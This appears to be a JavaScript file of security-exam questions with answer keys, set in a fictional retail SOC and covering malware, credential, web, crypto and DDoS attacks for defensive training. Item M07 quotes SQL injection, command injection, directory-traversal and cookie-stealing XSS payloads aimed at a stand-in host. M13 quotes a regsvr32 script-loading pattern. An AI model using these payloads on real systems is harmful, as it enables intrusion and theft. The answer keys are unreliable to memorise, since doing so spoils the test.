window.EXAM_QUESTIONS = [{"id":"M01","type":"classify","theme":"Malware types and behaviours","points":5,"scenario":"You are the new SOC analyst at Meridian Retail. Your first task of the shift is to read the queue and sort every alert into one of four buckets so the senior analyst can pick the urgent ones first.","question":"Place each alert under the malware or activity type it describes best.","buckets":["Ransomware","Worm","Spyware or keylogger","Logic bomb"],"items":["Files on the finance share are renamed with a strange extension and a text file asking for payment appears in every folder","The same malicious process appears on 40 hosts in 10 minutes and spreads over SMB with no user action","A small program records every keystroke and mails the text to a free webmail account every hour","A script waits for the payroll clerk's account to be deleted from Active Directory, then wipes the accounting database","A scheduled task encrypts the backup repository at midnight on the last day of the month","A hidden process reads the clipboard and the browser password store on the sales director's laptop"],"answer":[0,1,2,3,0,2],"whyEach":["Mass renaming plus a payment note is the classic ransom note pattern, so this is ransomware.","Spreading on its own over SMB without a user clicking anything is the definition of a worm.","Recording keys and sending them out is spyware whose speciality is the keylogger.","Code that stays asleep until a trigger event and then destroys data is a logic bomb.","Encrypting files and holding them for payment is ransomware, even when a scheduled task does the work.","Reading the clipboard and saved passwords is spyware behaviour on the endpoint."],"hint":"Ask what the code does to the victim: encrypt, spread alone, watch the user, or wait for a trigger.","why":"Malware is named after its main behaviour, not after its file name. Ransomware encrypts and demands payment. A worm copies itself across the network with no user action. Spyware gathers information, and a keylogger is the spyware sub-type that records typing. A logic bomb stays quiet until a date or an event triggers it. Real samples often do several of these things, so you sort them by the behaviour that has the biggest effect right now: encryption, spread, spying, or staged data leaving the network as exfiltration.","kw":["ransomware","worm","spyware","keylogger","logic bomb","indicators of compromise (IoC)","exfiltration"]},{"id":"M02","type":"mcq","theme":"Malware types and behaviours","points":5,"scenario":"A user at Meridian Retail calls the help desk. She says she downloaded a free PDF converter from a software review site last week. Since then the tool prints a certificate warning each time it starts, and the network team sees the process talking to an unfamiliar address every few minutes.","question":"Which malware type does this evidence match best?","opts":["A worm that copies itself to every share","A trojan inside the tool she chose to install","A rootkit that hides below the operating system","A fileless script that only lives in memory"],"correct":[1],"hint":"The clue is that she chose to install the program herself because it looked useful.","why":"A trojan is malware that pretends to be a program the user wants, so the user installs it personally. The certificate warning and the regular outbound contact fit a backdoor inside a fake utility. A worm would spread to other hosts without her installing anything, a rootkit would hide in the kernel and would not normally show a certificate warning, and a fileless script would leave no installed program to warn about. A virus also spreads by infecting files or programs, while a packed sample that hides behind a fake utility and changes its appearance is closer to polymorphic or armored malware. The lesson is that the delivery story matters as much as the technical symptom.","kw":["trojan","backdoor","beacon","worm","rootkit","fileless malware","virus","polymorphic malware","armored virus","initial access"]},{"id":"M03","type":"classify","theme":"Password and credential attacks","points":5,"scenario":"You are on the identity team at Meridian Retail. The ticket system hands you three authentication incidents from last night and asks you to name each one before anyone writes a report.","question":"Label each authentication incident with the attack it shows.","buckets":["Brute force","Credential stuffing","Password spraying","Session hijacking"],"items":["412 failed logons for the account m.okafor from one address, one attempt every second for seven minutes","61 successful logons for 61 different accounts, all from one address, all using the password from a 2019 gaming-site breach list","9 failed logons, one for each of nine accounts, all from one address, all using the same password","A logon with no password prompt at all, using a session cookie copied from a laptop on the visitor network"],"answer":[0,1,2,3],"whyEach":["Hundreds of attempts against one account is brute force: many guesses, one target.","A leaked list of username and password pairs used across many accounts is credential stuffing.","One password tried once against many accounts is password spraying, which stays under the lockout counter.","Reusing a stolen session cookie with no password step is session hijacking, also called session replay."],"hint":"Count two things: how many accounts are attacked, and how many passwords are tried per account.","why":"The pattern tells you the attack. Many passwords against one account is brute force. One password across many accounts is password spraying, which is quiet because each account stays under the lockout threshold. Reused breach pairs are credential stuffing, and it succeeds because people reuse passwords. Copying a live session token instead of logging in is session hijacking, and only short session lifetimes and binding the session to the device limit it.","kw":["brute force attack","credential stuffing","password spraying","session hijacking","session replay","credential access"]},{"id":"M04","type":"mcq","theme":"Password and credential attacks","points":5,"scenario":"The 200 most common passwords were used once each, in a slow loop, against every account in the sales department of Meridian Retail. No single account reached the lockout threshold, so nothing was locked and nothing alerted. Two accounts used a password from that list.","question":"Which change would have stopped this attack from succeeding?","opts":["Shortening the session timeout on the customer portal","Adding MFA on the portal and limiting attempts per source","Lowering the lockout threshold to five failed attempts","Forcing a password change every 30 days for all staff"],"correct":[1],"hint":"The attack avoided the lockout counter on purpose, so a control that counts attempts per account cannot see it.","why":"This is password spraying: one guess per account, so a per-account lockout counter never fires. The defences that work are a second factor, which a stolen password cannot satisfy, and limits on attempts from one source or one address range. A shorter session timeout does nothing before the logon. A five-attempt lockout still never fires, because each account sees one attempt. Frequent password changes do not help either, because the attacker only needed a weak, popular password once.","kw":["password spraying","multifactor authentication (MFA)","brute force attack","dictionary attack","offline hash cracking","vulnerability scan"]},{"id":"M05","type":"terminal","theme":"Network attacks","points":5,"scenario":"The network team at Meridian Retail suspects an on-path (man-in-the-middle) position on the visitor network after ARP poisoning was reported, and they also want a packet capture of the traffic to the gateway so it can be reviewed later. Traffic volumes are low, so filtering in the capture tool is preferred to filtering on the command line.","question":"Type the command that captures live traffic to and from the host 10[.]20[.]30[.]44 and writes it to the file mitm.pcapng, so the capture can be opened and filtered later in the packet capture tool.","sample":"Capturing on 'Ethernet0'\n    1 0.000000 10[.]20[.]30[.]44 -> 10[.]20[.]30[.]1 TCP 74 51234 -> 443 [SYN]\n    2 0.000412 10[.]20[.]30[.]1 -> 10[.]20[.]30[.]44 TCP 66 443 -> 51234 [SYN, ACK]\n    3 0.112044 10[.]20[.]30[.]44 -> 10[.]20[.]30[.]1 TCP 66 51234 -> 443 [ACK]\nFrames captured: 3","parts":[{"label":"uses tcpdump to capture live traffic","re":"\\btcpdump\\b"},{"label":"filters on the host under suspicion","re":"host\\s+10\\[\\.\\]20\\[\\.\\]30\\[\\.\\]44"},{"label":"writes the capture to a file","re":"(-w\\s*\\S*mitm\\.pcapng|\\bmitm\\.pcapng\\b)"}],"solution":"tcpdump -i any host 10[.]20[.]30[.]44 -w mitm.pcapng","hint":"The command line packet capture tool on this sensor is tcpdump. Give it the host filter expression and the write flag that takes the file name, so nothing is printed to the screen.","why":"The command names the interface, then the filter, then the output file. The filter 'host 10[.]20[.]30[.]44' keeps both directions of that host's traffic, which is what you need when you hunt for an on-path attacker or ARP poisoning. Writing to mitm.pcapng instead of printing to the screen means the file can be opened later in the packet capture tool, filtered by protocol, and kept as evidence. In a real incident you also note the interface, the start time and the host, and you keep the capture read-only so nobody can claim it was altered. Once the file is open in the packet capture tool you can filter for the suspicious conversation, and the same file later answers questions about a rogue access point, an evil twin, a deauthentication attack or war driving, because all of those leave traffic on the wireless network that reveals a spoofing attempt.","kw":["on-path (man-in-the-middle) attack","ARP poisoning","packet capture","Wireshark","spoofing","DNS poisoning","rogue access point","evil twin","deauthentication attack","war driving","replay attack","network traffic analysis","DNS tunneling","watered hole attack"]},{"id":"M06","type":"match","theme":"Password and credential attacks","points":5,"scenario":"A junior analyst at Meridian Retail asks you to check a one-page summary before it goes to the incident manager. The page lists five attacks, but the descriptions were pasted in the wrong order.","question":"Match each attack to the description that belongs to it.","pairs":[["Password spraying","One password tried once against many accounts"],["Brute force attack","Every possible combination tried against one account"],["Dictionary attack","Words from a wordlist tried against one account"],["Rainbow table","Precomputed lookup used to reverse a stored hash"],["Credential stuffing","Leaked username and password pairs replayed on other sites"]],"hint":"Separate the attacks by what they try and by how many accounts they touch.","why":"These five attacks are easy to confuse because all of them guess something. The differences that matter are the number of accounts and whether the guesses are computed live. A brute force attack enumerates combinations, a dictionary attack uses a wordlist, and spraying uses a single popular password across many accounts to stay under the lockout counter. Credential stuffing replays real stolen pairs, and a rainbow table is not a guessing attack at all: it reverses a hash that the attacker already has. Defences follow the same split: rate limits and a second factor for online guessing, salting and slow hashing for stolen hash files.","kw":["password spraying","brute force attack","dictionary attack","rainbow table","credential stuffing","offline hash cracking","reconnaissance"]},{"id":"M07","type":"classify","theme":"Application attacks and vulnerabilities","points":5,"scenario":"A web proxy log from the Meridian Retail customer portal shows four suspicious requests, all sent within two minutes from the same test workstation. The developer team is waiting on the security review before it starts fixing code.","question":"Place each request under the attack it shows.","buckets":["SQL injection (SQLi)","Command injection","Directory traversal","Cross-site scripting (XSS)"],"items":["GET /reports?year=2023%27%20UNION%20SELECT%20card_number%20FROM%20payments--","GET /tools/ping?host=10[.]20[.]30[.]9%3Bcat%20/etc/shadow","GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd","GET /search?q=%3Cscript%3Edocument.location%3D%27hxxp%3A%2F%2Fevil-collect[.]example%2Fc%3F%27%2Bdocument.cookie%3C%2Fscript%3E"],"answer":[0,1,2,3],"whyEach":["A UNION SELECT inside a report parameter is SQL injection: the attacker wants database rows back.","A semicolon followed by 'cat /etc/shadow' hands a second command to the shell, so this is command injection.","The ..%2F sequences walk up out of the web folder towards /etc/passwd, which is directory traversal.","A script tag inside the search parameter is reflected XSS: the victim's browser will run the attacker's JavaScript and send the session cookie away."],"hint":"Look at what each payload is trying to reach: the database, the shell, the file system, or the victim's browser.","why":"These four payloads look similar in a log because they are all clever input, but the target is different every time. SQL injection aims at the database, command injection aims at the operating system shell, directory traversal aims at files outside the web root, and XSS aims at the browser of the next visitor. The right fix is different for each one: parameterised queries, an allow list of permitted argument values, path normalisation with a fixed base folder, and output encoding plus a content security policy.","kw":["SQL injection (SQLi)","command injection","directory traversal","cross-site scripting (XSS)","input validation","parameterised query","output encoding"]},{"id":"M08","type":"mcq","theme":"Application attacks and vulnerabilities","points":5,"scenario":"The Meridian Retail customer login page builds its database query by gluing strings together: \"SELECT id FROM users WHERE email = '\" + email + \"' AND pw = '\" + pw + \"'\". A tester entered a quote mark in the email field and the page returned a database error with a fragment of the query.","question":"Which change fixes the root cause?","opts":["Hiding database errors behind a generic failure page","Sending the SQL statement and its values separately","Blocking quote marks in every parameter at the WAF","Encoding the quote character before the database sees it"],"correct":[1],"hint":"The problem is not the error message. The problem is that the input is treated as part of the query.","why":"When the input is concatenated into the query text, a quote mark can close the string and change the logic, which is SQL injection. A parameterised query sends the statement and the values separately, so the database treats the input as data only and the attack cannot change the query shape. Hiding errors is useful hardening, but the injection still works. A WAF rule that blocks quote marks has a bypass list and breaks real users. Encoding one character is not a systematic fix; the safe pattern is parameterisation everywhere, with input validation as a second layer.","kw":["SQL injection (SQLi)","parameterised query","input validation","OWASP Top 10","execution"]},{"id":"M09","type":"mcq","theme":"Application attacks and vulnerabilities","points":5,"scenario":"A Meridian Retail customer clicks a link in a game forum. The next request in the proxy log is a POST to the bank area of the customer portal that moves 900 GBP. The customer never visited the bank page in that session. The portal accepts the request because the session cookie is valid.","question":"Which weakness made the transfer possible?","opts":["The random anti-forgery token in each form is not checked","The query parameter is not covered by an allow list","The HTTP response is not encoded before it is rendered","The request arrives while the session cookie is still valid"],"correct":[0],"hint":"The browser sent the session cookie automatically to a form the user never intended to submit.","why":"This is cross-site request forgery. The victim's browser holds a valid session cookie for the bank site, so a form generated by another site is submitted with that cookie attached, and the bank cannot tell the request from a genuine one. The fix is a random anti-forgery token stored in the page and checked on the server, because the attacker's page cannot read it, plus an Origin or Referer check on state-changing requests. An allow list on the parameter, output encoding and certificate pinning are all real controls, but none of them answers the question of whether the user meant to send this request. The request arriving while the cookie is valid is exactly the problem, not the missing control.","kw":["cross-site request forgery (CSRF)","session hijacking","output encoding","certificate pinning","OWASP Top 10"]},{"id":"M10","type":"spot","theme":"Application attacks and vulnerabilities","points":5,"scenario":"An EDR rule flagged a change in the system folder of a Meridian Retail accountant's workstation, and the analyst on duty wrote up every line of evidence in the ticket. The change happened during the vendor's update window and the accountant was using the document tool at the time.","question":"Flag every line in the artefact that is suspicious and must be investigated.","art":{"kind":"code","pick":true,"title":"EDR ticket 4471, evidence list","lines":["File created: C:\\Windows\\System32\\docconv.dll at 09:41 during the vendor's approved update window","Signature: valid, issued to the document-tool vendor, chain verified to a trusted root","Hash: matches the digest published on the vendor's release notes page for version 14.2","Process: docconv.exe started by the user's own session at 09:42 and exited at 17:05","Registry: a Run key was added at 09:44 pointing to C:\\Users\\Public\\svc32.exe","Network: docconv.exe sent 40 MB to the vendor's licensed update endpoint over TLS","File: C:\\Users\\Public\\svc32.exe is unsigned, 9 days old, and listens on port 4444","Scheduled task: UpdSvc written at 09:45 runs svc32.exe every 30 minutes"]},"bad":[4,6,7],"whyEach":["A file created during the vendor's approved update window is expected change activity, not a finding.","A valid signature with a chain to a trusted root is what a reviewer wants to see.","A hash that matches the vendor's published release notes removes the tampering question.","A process started by the logged-in user and closed at the end of the working day is ordinary use.","A Run key that points at an unsigned binary in a public folder is persistence and must be investigated.","Traffic to the vendor's own licensed endpoint over TLS matches the product's normal licence check.","An unsigned nine-day-old binary listening on a high port is a backdoor listener and must be investigated.","A scheduled task that runs that binary every 30 minutes is persistence and must be investigated."],"hint":"Five lines carry the evidence that clears the alert: the approved change window, a valid signature, a published hash, the user's own session, and the vendor's own endpoint. Three lines have no explanation.","why":"Three of the eight lines stand out because nothing in the vendor's release explains them: an unsigned binary in a public folder, a Run key that the update process did not create, and a scheduled task that runs that binary every thirty minutes. Together they are persistence and a backdoor listener, which is a real incident. The other five lines are the evidence that clears the update itself, and a team that reopens every signed update as an incident will miss the real intrusion in the noise. Separating the two questions is the skill: the update is a false positive, and the persistence is not.","kw":["malware signature","sandbox analysis","supply chain attack","malicious update","indicators of compromise (IoC)","defense evasion"]},{"id":"M11","type":"order","theme":"Malware types and behaviours","points":5,"scenario":"The Meridian Retail SOC has a new playbook for handling a suspicious email attachment. Your team lead asks you to put the workflow in the right order before it is published, because the current draft starts by writing the report.","question":"Put the steps of the workflow in the correct order, from the first action to the last.","items":["Submit the file hash to the reputation service and record what is already known about it","Run the attachment in the detonation sandbox and watch the process, file and network behaviour","Extract the macro or script and read the code with a disassembler in a safe lab host","Block the sender, the subject pattern and any file hash or address found on the mail gateway","Write the indicators of compromise into the ticket and share them with the threat intelligence team"],"hint":"Start with the cheap checks that need no analysis skill, and end with the knowledge that leaves the case for other defenders.","why":"The order matters because each step makes the next one cheaper. A hash lookup takes seconds and may close the case before any lab time is spent. Dynamic analysis in a detonation sandbox shows what the file actually does, which is the safest way to learn its behaviour. Static reading of the extracted code comes after that, because you already know which parts deserve attention. Blocking the sender, the subject and the indicators protects everyone else, and writing the indicators down means the next analyst starts where you finished. Reporting first, as in the draft playbook, wastes the evidence you have not collected yet.","kw":["sandbox analysis","dynamic analysis","static analysis","indicators of compromise (IoC)","malware signature","VirusTotal","Cyber Kill Chain","MITRE ATT&CK"]},{"id":"M12","type":"fill","theme":"Malware types and behaviours","points":5,"scenario":"Meridian Retail's threat hunting team writes a one-page note after a case on a laptop that had no malicious file on disk. Complete the note with the correct terms.","question":"Choose the correct term for each gap in the hunting note.","parts":["Nothing new appeared on disk and the scanner reported nothing, so this was ",{"b":0},", sometimes called living off the land because it uses tools already installed on the host. ","The laptop contacted the same host every ninety seconds, which is the ",{"b":1}," that keeps the channel open. ","The lasting control is to block binary payloads at the proxy, so that even a built-in tool cannot fetch or post ",{"b":2},". "],"answers":["fileless malware","beacon","command and control (C2)"],"extras":["a boot sector virus","a logic bomb","a rainbow table"],"hint":"There is no file to scan, the traffic is regular, and the remote host is giving the attacker orders.","why":"Fileless malware keeps its code in the memory of a trusted process or in a script that the operating system already runs, so a signature scanner has no file to match. The regular contact every ninety seconds is a beacon, which is deliberately boring traffic that looks like a normal health check. The host it talks to is the command and control channel, and that is where the attacker sends instructions and receives stolen data. A boot sector virus would be visible at startup and would survive a disk wipe, and a logic bomb produces no traffic at all until its trigger fires, so neither matches the evidence. A rainbow table is a tool for reversing password hashes and has nothing to do with this case. Detection for this kind of malware comes from process lineage, command-line arguments and the timing pattern of outbound connections, because a rootkit on the same host could hide the process list from a standard tool and a worm on the network would show the same traffic on many hosts at once.","kw":["fileless malware","living off the land","boot sector virus","worm","logic bomb","beacon","malware signature","command and control (C2)","rootkit"]},{"id":"M13","type":"spot","theme":"Malware types and behaviours","points":5,"scenario":"A Meridian Retail laptop was reimaged last week after a malware case. The user reports that it still slows down in the afternoon and that the antivirus console shows nothing. You export a short list of records from the host and read it line by line.","question":"Flag every line in the artefact that shows a detection-evasion mechanism or an active hidden component.","art":{"kind":"code","pick":true,"title":"Host review export, laptop MRL-4471","lines":["DRIVER  \\SystemRoot\\System32\\drivers\\netbt.sys        loaded   Microsoft Windows","DRIVER  \\??\\C:\\Windows\\System32\\drivers\\vk7h2.sys     loaded   (no valid signature)","SERVICE vk7h2        type=kernel  start=boot  image=vk7h2.sys  state=RUNNING","PROCESS chrome.exe   pid=4412  parent=explorer.exe  user=m.okafor","PROCESS conhost.exe  ppid=4412  session=1  cpu=0%  threads=3  (visible in taskmgr)","HOOK    SSDT entry 0x1a rewritten -> 0xFFFFF8800A4C1120 (vk7h2.sys)","FILE    C:\\Users\\m.okafor\\AppData\\Local\\Temp\\~DF4A1B.tmp  size=0  hidden","TASK    \\Microsoft\\Windows\\Update\\UpdSvc  next run 14:00 daily  action=regsvr32 /s /n /u /i:file.sct scrobj.dll"]},"bad":[1,2,5,6,7],"whyEach":["netbt.sys is a normal Windows driver signed by Microsoft, so this line is expected.","A driver with no valid signature in the drivers folder is an evasion and hiding component, which is rootkit territory.","A kernel service that starts at boot and is still running is how a rootkit keeps itself loaded, so this line deserves a flag.","chrome.exe started by explorer.exe from the user's own session looks like ordinary browser use.","conhost.exe is a normal Windows console host, so it is not evidence by itself.","An SSDT entry rewritten by a third-party driver is a system service table hook, which is a classic rootkit hiding technique.","A zero-byte hidden file in Temp with a tilde name is a marker or staging file that the user never created.","A scheduled task that runs regsvr32 with the /i:file.sct pattern is a built-in tool being used to load remote script content, which is fileless execution and persistence."],"hint":"Normal Windows drivers and processes are signed and named. Look for anything unsigned, hooked, hidden, or driven by a built-in tool with odd arguments.","why":"A rootkit hides by living below the level where normal tools look. Two signs here give it away: a kernel driver that starts at boot without a valid signature, and a system service table entry that has been rewritten to point into that driver. The hidden zero-byte file and the unusual scheduled task show that someone also wants the code to come back after a reboot. When you find this pattern you do not clean the host from inside the running system, because the rootkit controls the view of the system: you capture memory, take an image, and rebuild the host from a known good image. The hidden file and the scheduled task are also indicators of compromise that go into the case file, so other hosts can be searched for the same names.","kw":["rootkit","fileless malware","persistence","living off the land","malware signature","indicators of compromise (IoC)","privilege escalation"]},{"id":"M14","type":"classify","theme":"Physical and social attacks","points":5,"scenario":"The security awareness team at Meridian Retail is building a short briefing about physical and social risks. They hand you six reports from the last quarter and ask you to label each one.","question":"Place each report under the technique it shows.","buckets":["Tailgating","Shoulder surfing","USB drop attack","Badge cloning","Dumpster diving","Honeypot"],"items":["A visitor follows an employee through the badge door with an armful of boxes and never shows a badge","A stranger in the coffee queue films the finance clerk typing the payroll portal password","Three unbranded USB sticks appear in the staff car park and one is plugged into a laptop","A reader in the lobby is read with a handheld device from a car, and a copy of the badge is written to a blank card","A contractor takes shredded-looking papers from the recycling bin and finds an unshredded bank statement","A fake server is placed in the guest VLAN to attract attackers and record what they try"],"answer":[0,1,2,3,4,5],"whyEach":["Following someone through a controlled door without presenting a badge is tailgating.","Watching a screen or a keyboard over somebody's shoulder is shoulder surfing.","Leaving USB sticks where staff will find and plug them in is a USB drop attack.","Copying a badge credential with a handheld reader and writing it to another card is badge cloning.","Taking documents out of the rubbish to find information is dumpster diving.","A decoy system that exists only to attract and record attackers is a honeypot, and a fake credential inside it is a honeytoken."],"hint":"Ask what the attacker did with their body, their hands, or their computer.","why":"Physical attacks often need no exploit at all. Tailgating and shoulder surfing use social pressure and proximity. A USB drop attack relies on curiosity, and badge cloning turns a two-second read of a card into a working key. Dumpster diving recovers the paper that policies were supposed to shred. The countermeasures are equally physical: an access control vestibule or mantrap that admits one person at a time, privacy screens and desk position, endpoint rules that block unknown USB storage, shielded card holders and encrypted credentials with a challenge-response card, cross-cut shredders with a written disposal routine, and deception assets such as honeypots and honeytokens that tell you an attacker is already inside.","kw":["tailgating","shoulder surfing","USB drop attack","badge cloning","dumpster diving","honeypot","honeytoken","access control vestibule","mantrap","resource development"]},{"id":"M15","type":"order","theme":"Physical and social attacks","points":5,"scenario":"You are the incident responder on call at Meridian Retail. At 21:15 the badge system reports a valid finance badge at the data-centre door, but the owner of that badge is on holiday abroad. The host on the next rack starts a large outbound transfer. Your team lead asks you to put the first response steps in order.","question":"Put the first-response steps in the correct order, from the first action to the last.","items":["Suspend the badge credential and keep the door log and camera footage for the last 24 hours","Send a guard to the data-centre floor and check who is physically present at the rack","Capture the running system state of the affected host before it is powered off","Review the door controller logs for any other badges used in the same window","Find out how the badge was copied or loaned and fix that path"],"hint":"The attacker may still be in the building, so the first steps protect people and evidence, not systems.","why":"With a possible intruder on site, the first move is to stop the credential from opening more doors and to preserve the camera and door logs, because they are overwritten quickly. A guard on the floor comes next, since an attacker at the rack can destroy evidence faster than any remote action. Capturing the host's memory and disk state before shutdown protects the technical evidence. Reviewing the door logs shows whether the same badge or other badges were used nearby, which turns one event into a picture. Only then do you investigate how the badge was cloned or borrowed, because that fix removes the cause. Powering the host off first, which feels natural, would lose the memory evidence.","kw":["badge cloning","proximity reader bypass","chip-off attack","facility perimeter control","tailgating","indicators of compromise (IoC)"]},{"id":"M16","type":"classify","theme":"Cryptographic attacks","points":5,"scenario":"The Meridian Retail crypto review meeting covers five findings from last quarter's penetration test. Each finding below is described by the one observation the tester actually recorded.","question":"Place each finding under the cryptographic attack it describes.","buckets":["Brute force key search","Downgrade attack","Known plaintext attack","Birthday collision attack","Weak key"],"items":["The tester tried every key on the 40-bit key space until the plaintext appeared","The tester forced the handshake to fall back from TLS 1.3 to SSL 3.0, where a broken cipher was still offered","The tester knew the exact format of the first 64 bytes of every message and used that knowledge to test candidate keys","The tester generated many pairs of files until two different files produced the same 128-bit hash value","The tester found the device shipped with a hard-coded default key that is identical on every unit"],"answer":[0,1,2,3,4],"whyEach":["Testing the whole key space of a short key is a brute force key search, and the answer is a long random key.","Forcing the connection back to an older protocol version is a downgrade attack, and the answer is to refuse old versions.","Using a known part of the message to test candidate keys is a known plaintext attack.","Finding two different inputs with the same hash value is a collision attack, which became practical against MD5 and SHA-1.","A key that is the same on every device is a weak key, and no amount of key length fixes it."],"hint":"Ask what the attacker already knew: nothing, the message layout, the protocol choice, the hash length, or the key itself.","why":"Every one of these findings is an attack on the design rather than on the maths alone. A short key can be searched, so the fix is key length and a modern algorithm. A server that still offers an old protocol lets an attacker push the client down to it, so the fix is to disable every legacy version and cipher suite. A known plaintext attack works when the message format is predictable, which is why you add a random initialisation vector or a nonce. A birthday collision attack needs only about the square root of the hash space, which is why MD5 and SHA-1 must be replaced. A hard-coded key is a weak key, and the fix is per-device keys stored in hardware.","kw":["brute force key search","downgrade attack","known plaintext attack","birthday attack","collision attack","weak key","MD5","SHA-1"]},{"id":"M17","type":"mcq","theme":"Cryptographic attacks","points":5,"scenario":"A Meridian Retail VPN concentrator still accepts a certificate that is signed with MD5, and the same device offers RC4 and a 1024-bit Diffie-Hellman group during the handshake. The vendor says the platform is end of life and no firmware update exists.","question":"Which attack is the most realistic consequence of this configuration?","opts":["An attacker builds two certificates with the same MD5 hash","A ciphertext-only attack against the session key itself","A side-channel attack on the power use of the client","A pass the hash attack reusing the cached logon hash"],"correct":[0],"hint":"MD5 has been broken for collisions for years, and a certificate is only as strong as the hash inside its signature.","why":"MD5 cannot resist collisions: an attacker who can build two different certificates with the same MD5 hash can obtain a signature on a harmless one and use it on the malicious one, which is certificate spoofing. The weak Diffie-Hellman group and RC4 make the session key easier to attack as well, but the strongest and most realistic consequence on this platform is a forged certificate. A ciphertext-only attack is the hardest class and is not what a broken signature hash enables. A side-channel attack needs physical access to the device. Pass the hash is a Windows credential technique and has nothing to do with a TLS handshake. The fix is to retire the platform or terminate TLS on a modern reverse proxy in front of it.","kw":["MD5","collision attack","certificate spoofing","downgrade attack","ciphertext only attack","pass the hash","man-in-the-middle key exchange"]},{"id":"M18","type":"fill","theme":"Password and credential attacks","points":5,"scenario":"You are writing the lesson note for the Meridian Retail service desk after a session hijacking case on the customer portal. Complete the note with the correct terms.","question":"Choose the correct term for each gap in the note.","parts":["The attacker captured the live ",{"b":0}," from the request of a logged-in customer and pasted it into their own browser, so no password was ever needed. ","The attacker never had to crack the password; the theft happened in the middle of the connection, which is why this is called ",{"b":1},". ","Two controls stop this: mark the cookie ",{"b":2}," and enforce HTTPS on the whole site. "],"answers":["session cookie","an on-path attack","HttpOnly"],"extras":["an offline hash cracking run","KeePass","a rainbow table","SSO"],"hint":"One gap is the token that proves a session, one names the attacker position in the middle of the traffic, and one is the cookie flag that keeps scripts away from it.","why":"A session cookie is the token the browser sends to prove that the user already logged on, so stealing it is as good as stealing the password. Theft while the traffic is in flight is an on-path attack, also called man-in-the-middle, and on a plain HTTP site anyone on the same network can read it. The HttpOnly flag stops JavaScript from reading the cookie, which also blunts cross-site scripting, and a site-wide HTTPS rule with a secure cookie flag stops the cookie from travelling in clear text. Offline hash cracking and rainbow tables attack a stolen password file, not a live session, so they are the wrong terms here.","kw":["session hijacking","on-path (man-in-the-middle) attack","cross-site scripting (XSS)","rainbow table","offline hash cracking","bluesnarfing","51 percent attack"]},{"id":"M19","type":"classify","theme":"Application attacks and vulnerabilities","points":5,"scenario":"The Meridian Retail web team is triaging four bug reports from a tester who had a normal staff account and no special tools. Each report is a fragment of what the tester saw. Sort them by the vulnerability class each report shows.","question":"Place each bug report under the vulnerability class it belongs to.","buckets":["Insecure direct object reference","Server-side request forgery","Reflected cross-site scripting","Race condition (TOCTOU)"],"items":["Changing the id in the address bar from 1042 to 1043 shows another customer's name, address and last order","Sending the preview parameter as an internal address makes the server fetch a page the tester cannot reach","Sending a search term of a script tag makes the same script run in the next user's browser","Sending the same coupon redemption twice within four milliseconds both succeed although the coupon is single use"],"answer":[0,1,2,3],"whyEach":["The server trusted an identifier from the client and never checked ownership, which is an insecure direct object reference.","The server was tricked into making a request on the tester's behalf, which is server-side request forgery.","A value from the request was rendered as HTML and executed in the browser, which is reflected cross-site scripting.","Two requests passed the check before either wrote, which is a race condition, also called time-of-check to time-of-use."],"hint":"Ask who trusted what: an identifier, a destination, a rendered value, or a timing window.","why":"All four reports come from the same tester with the same ordinary account, and that is the point: none of them needed special access. The first is broken access control, and the fix belongs on the server, because hiding the link protects nothing. The second is server-side request forgery, fixed by an allow list of destinations the feature may call. The third is reflected cross-site scripting, fixed by encoding the value for the HTML context and by a content security policy. The fourth is a timing flaw, fixed with a uniqueness constraint or a transaction, because a check and a write that happen separately can be interleaved. Naming the class correctly is what tells the developer which of the four fixes to write, and every one of them belongs in the OWASP Top 10 category of broken access control or injection. Note too that the first report is a discovery step in attacker terms: a working account can list identifiers until one returns somebody else's data, and input validation alone never fixes an authorisation fault.","kw":["OWASP Top 10","server-side request forgery (SSRF)","cross-site scripting (XSS)","race condition (TOCTOU)","input validation","cross-site request forgery (CSRF)","discovery"]},{"id":"M20","type":"branch","theme":"Network attacks","points":5,"scenario":"At 09:04 the Meridian Retail storefront starts timing out. The load balancer dashboard shows 380,000 half-open connections from 4,200 source addresses, all with a spoofed source. CPU on the web tier is low, but it cannot answer because the connection table is full. The on-call network engineer is on the phone with you.","question":"Work through the incident step by step. The second step only appears after you make the first decision.","steps":[{"sit":"The load balancer connection table is full of half-open TCP handshakes. What is your first move?","opts":["Enable SYN cookies and reduce the SYN retry timeout on the load balancer","Reboot the web servers so the connection table is cleared","Block all inbound ICMP traffic at the border router","Add four more web servers behind the load balancer"],"correct":0,"res":["Correct. SYN cookies let the load balancer answer handshakes without keeping state, so legitimate users can still connect while the spoofed half-open entries stop filling the table.","The table refills within seconds, and you lose the evidence and the service for a full restart. Rebooting is not a defence against a SYN flood.","ICMP is not the problem here. Blocking it changes nothing about the half-open TCP state table.","More servers do not help when the connection table itself is exhausted by half-open state."]},{"sit":"SYN cookies are on and the service answers again, but the attack traffic keeps doubling. The pattern is a clear volumetric flood. What do you do next?","opts":["Ask the carrier to enable blackhole routing or scrubbing for the attack range","Rate limit all traffic to the storefront to 100 requests per second","Publish a second public address and move the storefront there","Add a CAPTCHA to the storefront home page"],"correct":0,"res":["Correct. A volumetric flood is bigger than your pipe, so the filtering has to happen upstream with the carrier. Blackhole routing drops the attack traffic at the border, and a scrubbing service cleans it before it reaches you.","A global rate limit of 100 requests per second would block your own customers too, and the flood is far above that number anyway.","A new public address is found by the attackers within minutes, and it moves the problem rather than filtering it.","A CAPTCHA cannot help when the connection table is full before any HTTP request is parsed; the flood never reaches the application layer."]}],"hint":"Separate the resource that is exhausted from the bandwidth that is consumed: fill the table first, then push the filtering upstream.","why":"A TCP SYN flood exhausts the connection table rather than the CPU, because each half-open handshake holds state. SYN cookies remove that state and are the first, cheapest fix. When the traffic becomes genuinely volumetric, no device on your own network can help, because the attack fills the link before it reaches you. That is when you call the carrier for blackhole routing or a scrubbing service, and you document the source ranges and the timeline for the post-incident review. This exercise covers a denial of service attack and a distributed denial of service, and it shows why the countermeasure changes when the bottleneck changes.","kw":["TCP SYN flood","distributed denial of service (DDoS)","blackhole routing","spoofing"]},{"id":"M21","type":"fill","theme":"Network attacks","points":5,"scenario":"You are writing the firewall change note for the Meridian Retail border router after a flood took the storefront offline for 40 minutes. Complete the note with the correct terms.","question":"Choose the correct term for each gap in the change note.","parts":["For each source address we apply a ",{"b":0}," of 20 new connections per second so that one host cannot open the whole table. ","The web servers sit in a ",{"b":1}," that holds only public services, so a compromise there does not reach the internal database. ","For the management interfaces we keep an ",{"b":2}," of approved administrator addresses instead of allowing the whole internet. "],"answers":["rate limit","demilitarised zone (DMZ)","allow list"],"extras":["deny list","end user licence agreement (EULA)","flat network"],"hint":"One gap is about counting connections per second, one is the public-facing network segment, and one is the opposite of a deny 